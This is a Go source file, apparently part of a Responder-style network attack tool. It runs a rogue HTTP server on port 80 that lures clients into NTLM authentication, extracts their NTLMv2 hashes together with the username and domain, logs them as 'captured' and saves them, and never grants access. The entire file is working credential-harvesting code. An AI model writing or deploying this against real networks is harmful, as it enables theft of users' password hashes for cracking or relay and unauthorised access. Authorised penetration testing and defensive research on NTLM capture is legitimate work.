package main

import (
	"encoding/base64"
	"fmt"
	"io"
	"net"
	"net/http"
	"strings"
	"sync"
)

// Per-connection NTLM state: store the challenge we issued so we can verify type3.
var connChallenges sync.Map // key: remoteAddr string, value: [8]byte

func serveHTTP(ifaceIP net.IP) {
	mux := http.NewServeMux()
	mux.HandleFunc("/", handleHTTPNTLM)

	addr := fmt.Sprintf("%s:80", ifaceIP)
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		logError("HTTP listen %s — %v (need root?)", addr, err)
		return
	}
	logInfo("HTTP listening on %s:80", ifaceIP)
	http.Serve(ln, mux)
}

func handleHTTPNTLM(w http.ResponseWriter, r *http.Request) {
	// Read and discard body to keep connection alive
	io.Copy(io.Discard, r.Body)

	auth := r.Header.Get("Authorization")

	if auth == "" {
		// Step 1: no auth header → send 401 with NTLM challenge advertisement
		logVerbose("HTTP connection from %s — sending NTLM negotiate", r.RemoteAddr)
		w.Header().Set("WWW-Authenticate", "NTLM")
		w.Header().Set("Connection", "keep-alive")
		w.WriteHeader(401)
		return
	}

	if !strings.HasPrefix(auth, "NTLM ") {
		w.Header().Set("WWW-Authenticate", "NTLM")
		w.WriteHeader(401)
		return
	}

	raw, err := base64.StdEncoding.DecodeString(strings.TrimPrefix(auth, "NTLM "))
	if err != nil {
		w.WriteHeader(400)
		return
	}

	ntlm := FindNTLMSSP(raw)
	if len(ntlm) < 12 {
		w.WriteHeader(400)
		return
	}

	msgType := uint32(ntlm[8]) | uint32(ntlm[9])<<8 | uint32(ntlm[10])<<16 | uint32(ntlm[11])<<24

	switch msgType {
	case 1: // NTLMSSP_NEGOTIATE → issue challenge
		challenge := getChallenge()
		connChallenges.Store(r.RemoteAddr, challenge)
		ntlmChallenge := BuildNTLMChallenge(challenge, sessionDomain, sessionMachineName)
		encoded := base64.StdEncoding.EncodeToString(ntlmChallenge)
		logVerbose("HTTP NTLM Type1 from %s — issuing challenge", r.RemoteAddr)
		w.Header().Set("WWW-Authenticate", "NTLM "+encoded)
		w.Header().Set("Connection", "keep-alive")
		w.WriteHeader(401)

	case 3: // NTLMSSP_AUTHENTICATE → capture hash
		val, ok := connChallenges.Load(r.RemoteAddr)
		if !ok {
			w.WriteHeader(401)
			return
		}
		challenge := val.([8]byte)
		connChallenges.Delete(r.RemoteAddr)

		hash, user, domain, err := ParseNTLMAuthenticate(ntlm, challenge)
		if err != nil {
			logVerbose("HTTP NTLM parse: %v", err)
			w.WriteHeader(401)
			return
		}
		logSuccess("[HTTP] NTLMv2 captured from %s", r.RemoteAddr)
		logSuccess("       %s\\%s", domain, user)
		logSuccess("       %s", hash)
		saveHash(hash)

		// Return 401 to indicate auth failed (we never actually authenticate)
		w.Header().Set("WWW-Authenticate", "NTLM")
		w.WriteHeader(401)

	default:
		w.WriteHeader(400)
	}
}
